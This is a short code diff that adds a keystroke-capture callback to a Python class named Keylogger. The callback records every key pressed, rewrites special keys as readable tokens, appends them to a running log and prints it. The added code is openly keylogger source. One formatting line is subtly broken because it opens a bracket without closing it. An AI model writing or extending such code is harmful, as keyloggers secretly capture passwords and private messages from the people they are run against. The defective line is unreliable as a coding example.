@@ -18,3 +18,18 @@ class Keylogger:
         self.log = ""
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}"
+        self.log += name
+        print(self.log)
